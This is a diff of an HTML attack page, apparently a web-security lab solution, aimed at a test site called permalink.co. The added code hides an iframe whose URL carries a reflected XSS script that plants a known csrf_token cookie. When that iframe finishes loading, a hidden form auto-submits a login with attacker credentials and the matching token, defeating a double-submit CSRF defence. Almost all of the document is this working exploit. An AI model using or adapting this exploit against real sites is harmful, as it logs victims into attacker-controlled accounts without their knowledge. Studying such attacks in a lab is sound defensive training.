@@ -1,26 +1,34 @@
-<!-- Working File, Not FInished -->
-
-
 <!DOCTYPE html>
 <html>
 	<head>
 		<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
 
-			<div style="display:none;">
-				<iframe id="invisible_danger" name="invisible_danger"></iframe>
+		<iframe style="display:none;" id="cookie_setter" name="cookie_setter" src="http://permalink.co/search?xssdefense=0&csrfdefense=1&q=%3Cscript%3Ewindow.onload%3Dfunction()%7Bdocument.cookie%3D%22csrf_token%3D12345678901234567890123456789012%22%7D%3C%2Fscript%3E" width="1000" height="400"></iframe>
 
-				<form id="invisible_form" method="POST" action="http://permalink.co/login?csrfdefense=1&xssdefense=0" target="invisible_danger">
+
+		<div style="display:none;">
+				<iframe id="invisible_danger" name="invisible_danger" width="1000" height="400"></iframe>
+
+				<form id="invisible_form" method="POST" action="http://permalink.co/login?xssdefense=0&csrfdefense=1" target="invisible_danger">
 					<input type="text" name="username" value="attacker" />
 					<input type="text" name="password" value="l33th4x" />
-					<input type="text" name="csrf_token" value = "6c7e790c39ad934fa54b7514e41cc628" />
-					<input type="text" name="csrfdefense" value="1" />
-					<input type="text" name="xssdefense" value="0" />
-
+					<input type="hidden" name="csrf_token" value="12345678901234567890123456789012" />
 				</form>
 
 				<script>
+				
+				var the_first_iframe = document.getElementById("cookie_setter");
+				the_first_iframe.onload = function(){
 				document.getElementById("invisible_form").submit();
+				}
 				</script>
-			</div>
+		</div>
+
 	</head>
 </html>
+
+<!-- 
+Source for method used:  	http://spamtech.co.uk/tips/automatically-submit-a-form-using-javascript/
+also used					http://crunchify.com/automatic-html-login-using-post-method-autologin-a-website-on-double-click/
+--> 
+
